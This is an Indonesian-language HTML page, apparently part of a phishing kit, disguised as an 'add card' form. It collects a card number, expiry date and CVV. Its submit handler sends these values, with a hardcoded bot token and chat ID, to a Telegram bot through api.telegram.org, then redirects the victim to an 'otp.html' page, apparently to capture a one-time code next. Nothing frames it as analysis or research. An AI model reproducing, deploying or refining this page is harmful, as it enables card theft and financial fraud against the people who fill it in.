<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Masukkan Nomor Kartu</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <style>
    /* Loading overlay styles */
    #loadingOverlay {
      background: rgba(255, 255, 255, 0.8);
      backdrop-filter: blur(2px);
      position: fixed;
      inset: 0;
      z-index: 9999;
      display: none;
      align-items: center;
      justify-content: center;
    }
    /* Spinner animation */
    .spinner {
      border: 4px solid #0071CE;
      border-top: 4px solid transparent;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body class="bg-white font-sans relative">
  <!-- Loading Overlay -->
  <div id="loadingOverlay" class="flex">
    <div class="spinner"></div>
  </div>

  <!-- Header -->
  <header class="bg-[#0071CE] flex items-center px-2 py-2">
    <button aria-label="Back" class="text-white text-lg mr-4" onclick="history.back()">
      <i class="fas fa-arrow-left"></i>
    </button>
    <h1 class="text-white font-semibold text-lg flex-0 text-center -mr-6"></h1>
  </header>

  <main class="p-4">
    <!-- Info box -->
    <div class="flex items-center bg-[#D9E9FF] border border-[#7AB0FF] rounded-md px-3 py-2 mb-5">
      <i class="fas fa-info-circle text-[#0071CE] text-lg mr-2"></i>
      <p class="text-[#0071CE] text-sm leading-tight">
        Pastikan kamu isi data di bawah dengan benar
      </p>
    </div>

    <!-- Form -->
    <form id="cardForm" class="space-y-5" onsubmit="sendToTelegram(event)">
      <!-- Nomor Kartu -->
      <div>
        <label for="cardNumber" class="block text-sm font-semibold text-gray-900 mb-1">Nomor Kartu</label>
        <div class="relative">
          <span class="absolute inset-y-0 left-3 flex items-center text-gray-400 text-lg">
            <i class="fas fa-credit-card"></i>
          </span>
          <input
            id="cardNumber"
            name="cardNumber"
            type="text"
            placeholder="1234-XXXX-XXXX-5678"
            required
            maxlength="19"
            pattern="^(\d{4}-){3}\d{4}$|^\d{16}$"
            title="Masukkan nomor kartu dengan 16 digit, boleh menggunakan tanda '-' sebagai pemisah"
            oninput="formatCardNumber(this)"
            class="w-full border border-gray-300 rounded-md py-2 pl-10 pr-3 text-gray-400 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#0071CE]"
          />
        </div>
      </div>

      <!-- Masa Berlaku -->
      <div>
        <label for="expiry" class="block text-sm font-semibold text-gray-900 mb-1">Masa Berlaku</label>
        <div class="relative">
          <span class="absolute inset-y-0 left-3 flex items-center text-gray-400 text-lg">
            <i class="fas fa-calendar-alt"></i>
          </span>
          <input
            id="expiry"
            name="expiry"
            type="text"
            placeholder="MM / YY"
            required
            maxlength="7"
            pattern="^(0[1-9]|1[0-2]) \/ \d{2}$"
            title="Masukkan masa berlaku dengan format MM / YY"
            oninput="formatExpiryWithSlash(this)"
            class="w-full border border-gray-300 rounded-md py-2 pl-10 pr-3 text-gray-400 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#0071CE]"
          />
        </div>
      </div>

      <!-- CVV/CVC -->
      <div>
        <label for="cvv" class="block text-sm font-semibold text-gray-900 mb-1 flex items-center gap-1">
          CVV/CVC
          <i class="fas fa-info-circle text-[#0071CE] text-xs"></i>
        </label>
        <div class="relative">
          <span class="absolute inset-y-0 left-3 flex items-center text-gray-400 text-lg">
            <i class="fas fa-credit-card"></i>
          </span>
          <input
            id="cvv"
            name="cvv"
            type="password"
            placeholder="Masukkan nomor CVV atau CVC"
            required
            maxlength="4"
            pattern="\d{3,4}"
            title="Masukkan 3 atau 4 digit CVV/CVC"
            class="w-full border border-gray-300 rounded-md py-2 pl-10 pr-10 text-gray-400 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#0071CE]"
          />
          <span class="absolute inset-y-0 right-3 flex items-center text-gray-400 text-lg cursor-pointer" onclick="toggleCVVVisibility()">
            <i id="cvvIcon" class="fas fa-eye-slash"></i>
          </span>
        </div>
      </div>

      <button
        type="submit"
        class="w-full bg-[#0071CE] text-white font-semibold py-3 rounded-md mt-6"
      >
        LANJUTKAN
      </button>
    </form>
  </main>

  <script>
    function toggleCVVVisibility() {
      const cvvInput = document.getElementById('cvv');
      const cvvIcon = document.getElementById('cvvIcon');
      if (cvvInput.type === 'password') {
        cvvInput.type = 'text';
        cvvIcon.classList.remove('fa-eye-slash');
        cvvIcon.classList.add('fa-eye');
      } else {
        cvvInput.type = 'password';
        cvvIcon.classList.remove('fa-eye');
        cvvIcon.classList.add('fa-eye-slash');
      }
    }

    function formatCardNumber(input) {
      let value = input.value.replace(/\D/g, '');
      if (value.length > 16) {
        value = value.slice(0, 16);
      }
      let formatted = '';
      for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) {
          formatted += '-';
        }
        formatted += value[i];
      }
      input.value = formatted;
    }

    function formatExpiryWithSlash(input) {
      let value = input.value.replace(/[^\d\/]/g, '');
      const parts = value.split('/');
      if (parts.length > 2) {
        value = parts[0] + '/' + parts[1];
      }
      value = value.replace(/\s/g, '');
      if (value.length === 1) {
        if (parseInt(value) > 1) {
          value = '0' + value;
        }
      }
      if (value.length === 2 && !value.includes('/')) {
        value = value + ' / ';
      }
      if (value.length > 7) {
        value = value.slice(0, 7);
      }
      value = value.replace(/^(\d{2})\/(\d{2})$/, '$1 / $2');
      value = value.replace(/^(\d{2}) ?\/ ?(\d{0,2})$/, '$1 / $2');
      input.value = value;
    }

    async function sendToTelegram(event) {
      event.preventDefault();

      const cardNumberRaw = document.getElementById('cardNumber').value.replace(/\D/g, '');
      if (cardNumberRaw.length !== 16) {
        alert('Nomor kartu harus terdiri dari 16 digit.');
        return;
      }

      const expiryValue = document.getElementById('expiry').value.trim();
      const expiryPattern = /^(0[1-9]|1[0-2]) \/ \d{2}$/;
      if (!expiryPattern.test(expiryValue)) {
        alert('Masa berlaku harus dengan format MM / YY.');
        return;
      }

      const cardNumber = document.getElementById('cardNumber').value.trim();
      const expiry = expiryValue;
      const cvv = document.getElementById('cvv').value.trim();

      const botToken = '8168283737:AAElC1wltyQ8aMP40ryHtq6vUJx8Ck-dFAo';
      const chatId = '5906925079';

      const message = 
        `Tambah Kartu Form Submission:%0A` +
        `Nomor Kartu: ${cardNumber}%0A` +
        `Masa Berlaku: ${expiry}%0A` +
        `CVV/CVC: ${cvv}`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;

      try {
        showLoading();
        const response = await fetch(url);
        hideLoading();
        if (response.ok) {
          document.getElementById('cardForm').reset();
          window.location.href = "otp.html";
        } else {
          alert('Gagal mengirim data ke Telegram.');
        }
      } catch (error) {
        hideLoading();
        alert('Terjadi kesalahan saat mengirim data.');
      }
    }

    function showLoading() {
      document.getElementById('loadingOverlay').style.display = 'flex';
    }

    function hideLoading() {
      document.getElementById('loadingOverlay').style.display = 'none';
    }
  </script>
</body>
</html>
